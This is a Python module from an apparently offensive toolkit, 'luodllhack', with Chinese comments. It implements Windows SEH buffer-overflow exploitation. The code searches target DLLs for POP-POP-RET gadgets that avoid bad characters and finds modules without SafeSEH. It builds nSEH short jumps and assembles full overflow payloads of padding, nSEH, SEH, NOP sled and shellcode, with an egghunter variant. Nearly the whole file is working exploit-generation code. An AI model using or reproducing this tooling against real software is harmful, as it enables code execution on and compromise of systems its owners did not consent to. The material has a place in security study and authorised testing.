# -*- coding: utf-8 -*-
"""
luodllhack/exploit/bypass/seh.py - SEH 利用模块

提供 Windows SEH (Structured Exception Handling) 溢出利用功能。

SEH 利用原理:
1. 溢出覆盖 SEH 链上的异常处理器地址
2. 触发异常时，控制流跳转到攻击者控制的地址
3. 使用 POP-POP-RET 序列跳转到 nSEH
4. nSEH 包含短跳转，跳过 SEH 到 shellcode

使用示例:
    seh = SEHExploit()

    # 查找 POP-POP-RET
    ppr = seh.find_pop_pop_ret('target.dll')

    # 生成 payload
    payload = seh.generate_payload(
        seh_offset=400,
        pop_pop_ret_addr=ppr,
        shellcode=shellcode
    )
"""

import struct
from dataclasses import dataclass
from typing import List, Optional, Tuple
import logging

from ..rop.finder import ROPGadgetFinder, Gadget

logger = logging.getLogger(__name__)


@dataclass
class SEHPayloadResult:
    """SEH Payload 生成结果"""
    payload: bytes
    nseh_offset: int
    seh_offset: int
    pop_pop_ret_addr: int
    shellcode_offset: int
    description: str


class SEHExploit:
    """
    SEH 溢出利用

    Windows SEH 链结构:
    - 每个 SEH 记录包含两个 DWORD:
      - nSEH: 指向下一个 SEH 记录的指针
      - SEH: 异常处理器地址

    利用步骤:
    1. 溢出覆盖 nSEH 和 SEH
    2. 在 SEH 中放置 POP-POP-RET 地址
    3. 在 nSEH 中放置短跳转指令
    4. 触发异常后:
       - 执行 POP-POP-RET
       - 返回到 nSEH
       - 执行短跳转到 shellcode
    """

    def __init__(self, finder: ROPGadgetFinder = None):
        """
        初始化 SEH 利用器

        Args:
            finder: ROPGadgetFinder 实例
        """
        self.finder = finder

    def find_pop_pop_ret(self,
                         binary_path: str,
                         bad_chars: List[int] = None) -> Optional[int]:
        """
        查找 POP-POP-RET gadget

        Args:
            binary_path: 二进制文件路径
            bad_chars: 要排除的坏字符

        Returns:
            Gadget 地址或 None
        """
        if self.finder is None:
            self.finder = ROPGadgetFinder()

        gadgets = self.finder.find_gadgets(binary_path, bad_chars=bad_chars)

        for g in gadgets:
            # 检查是否是 POP-POP-RET 模式
            parts = g.instructions.lower().split(';')
            parts = [p.strip() for p in parts]

            if len(parts) >= 3:
                # 检查前两个是 POP，最后一个是 RET
                if (parts[0].startswith('pop ') and
                    parts[1].startswith('pop ') and
                    parts[2].strip().startswith('ret')):

                    # 检查地址是否包含坏字符
                    if bad_chars:
                        addr_bytes = struct.pack('<I', g.address)
                        if any(b in bad_chars for b in addr_bytes):
                            continue

                    logger.info(f"Found POP-POP-RET at 0x{g.address:08x}: {g.instructions}")
                    return g.address

        logger.warning("No suitable POP-POP-RET found")
        return None

    def find_all_pop_pop_ret(self,
                              binary_path: str,
                              bad_chars: List[int] = None) -> List[Tuple[int, str]]:
        """
        查找所有 POP-POP-RET gadgets

        Returns:
            (地址, 指令) 元组列表
        """
        if self.finder is None:
            self.finder = ROPGadgetFinder()

        gadgets = self.finder.find_gadgets(binary_path, bad_chars=bad_chars)
        results = []

        for g in gadgets:
            parts = g.instructions.lower().split(';')
            parts = [p.strip() for p in parts]

            if len(parts) >= 3:
                if (parts[0].startswith('pop ') and
                    parts[1].startswith('pop ') and
                    parts[2].strip().startswith('ret')):

                    if bad_chars:
                        addr_bytes = struct.pack('<I', g.address)
                        if any(b in bad_chars for b in addr_bytes):
                            continue

                    results.append((g.address, g.instructions))

        return results

    def generate_nseh(self, jump_distance: int = 6) -> bytes:
        """
        生成 nSEH 短跳转指令

        Args:
            jump_distance: 跳转距离 (默认跳过 SEH 的 4 字节 + 2 字节对齐)

        Returns:
            4 字节的 nSEH 值
        """
        # EB XX = JMP SHORT XX
        # 90 90 = NOP NOP (填充)
        if jump_distance > 127 or jump_distance < -128:
            raise ValueError("Jump distance must be in range [-128, 127]")

        jmp_byte = jump_distance & 0xFF
        return bytes([0xEB, jmp_byte, 0x90, 0x90])

    def generate_payload(self,
                         seh_offset: int,
                         pop_pop_ret_addr: int,
                         shellcode: bytes,
                         padding_char: bytes = b'A',
                         nop_sled: int = 8) -> SEHPayloadResult:
        """
        生成完整的 SEH 溢出 payload

        Payload 结构:
        [padding][nSEH][SEH][nop_sled][shellcode]

        Args:
            seh_offset: 到 nSEH 的偏移
            pop_pop_ret_addr: POP-POP-RET 地址
            shellcode: Shellcode
            padding_char: 填充字符
            nop_sled: NOP 滑板大小

        Returns:
            SEHPayloadResult
        """
        # 生成 nSEH (短跳转，跳过 SEH)
        # 跳转距离: 跳过 SEH (4字节) + NOP 滑板开始
        nseh = self.generate_nseh(4 + 2)  # +2 for alignment

        # SEH = POP-POP-RET 地址
        seh = struct.pack('<I', pop_pop_ret_addr)

        # 构建 payload
        payload = bytearray()

        # 填充到 nSEH
        payload.extend(padding_char * seh_offset)

        # nSEH
        nseh_offset = len(payload)
        payload.extend(nseh)

        # SEH
        seh_real_offset = len(payload)
        payload.extend(seh)

        # NOP 滑板
        payload.extend(b'\x90' * nop_sled)

        # Shellcode
        shellcode_offset = len(payload)
        payload.extend(shellcode)

        return SEHPayloadResult(
            payload=bytes(payload),
            nseh_offset=nseh_offset,
            seh_offset=seh_real_offset,
            pop_pop_ret_addr=pop_pop_ret_addr,
            shellcode_offset=shellcode_offset,
            description=f'SEH exploit: offset={seh_offset}, PPR=0x{pop_pop_ret_addr:08x}'
        )

    def generate_egghunter_payload(self,
                                    seh_offset: int,
                                    pop_pop_ret_addr: int,
                                    egghunter: bytes,
                                    egg: bytes = b'w00t') -> SEHPayloadResult:
        """
        生成使用 Egghunter 的 SEH payload

        当直接存放 shellcode 空间不足时使用

        Args:
            seh_offset: 到 nSEH 的偏移
            pop_pop_ret_addr: POP-POP-RET 地址
            egghunter: Egghunter stub
            egg: Egg 标识符

        Returns:
            SEHPayloadResult
        """
        # 使用 egghunter 作为 shellcode
        return self.generate_payload(
            seh_offset=seh_offset,
            pop_pop_ret_addr=pop_pop_ret_addr,
            shellcode=egghunter,
            nop_sled=16  # 更大的 NOP 滑板
        )

    def check_safeseh(self, binary_path: str) -> bool:
        """
        检查模块是否启用 SafeSEH

        Args:
            binary_path: 二进制文件路径

        Returns:
            True 如果启用了 SafeSEH
        """
        try:
            import pefile
            pe = pefile.PE(binary_path)

            # 检查 Load Config 目录
            if hasattr(pe, 'DIRECTORY_ENTRY_LOAD_CONFIG'):
                load_config = pe.DIRECTORY_ENTRY_LOAD_CONFIG
                if hasattr(load_config, 'struct'):
                    # SEHandlerCount > 0 表示启用了 SafeSEH
                    if hasattr(load_config.struct, 'SEHandlerCount'):
                        return load_config.struct.SEHandlerCount > 0

            return False

        except Exception as e:
            logger.warning(f"Failed to check SafeSEH: {e}")
            return False

    def find_non_safeseh_modules(self, module_paths: List[str]) -> List[str]:
        """
        查找未启用 SafeSEH 的模块

        Args:
            module_paths: 模块路径列表

        Returns:
            未启用 SafeSEH 的模块路径列表
        """
        non_safeseh = []

        for path in module_paths:
            if not self.check_safeseh(path):
                non_safeseh.append(path)

        return non_safeseh

    def calculate_padding(self,
                          crash_offset: int,
                          nseh_pattern: bytes = b'BBBB') -> Tuple[int, int]:
        """
        计算填充大小

        使用崩溃时 nSEH 被覆盖的模式来计算

        Args:
            crash_offset: 发生崩溃时的偏移 (从 pattern_offset 获取)
            nseh_pattern: nSEH 被覆盖的值

        Returns:
            (到 nSEH 的填充, 到 SEH 的填充)
        """
        # nSEH 紧跟在 padding 后面
        # SEH 在 nSEH 之后 4 字节
        nseh_offset = crash_offset
        seh_offset = crash_offset + 4

        return nseh_offset, seh_offset

    def print_payload_info(self, result: SEHPayloadResult) -> None:
        """打印 payload 信息"""
        print(f"\nSEH Exploit Payload Info")
        print("=" * 40)
        print(f"Total size: {len(result.payload)} bytes")
        print(f"nSEH offset: {result.nseh_offset}")
        print(f"SEH offset: {result.seh_offset}")
        print(f"POP-POP-RET: 0x{result.pop_pop_ret_addr:08x}")
        print(f"Shellcode offset: {result.shellcode_offset}")

        # 显示 nSEH 和 SEH 值
        nseh_val = result.payload[result.nseh_offset:result.nseh_offset+4]
        seh_val = result.payload[result.seh_offset:result.seh_offset+4]
        print(f"\nnSEH value: {nseh_val.hex()} (short jmp)")
        print(f"SEH value: {seh_val.hex()}")
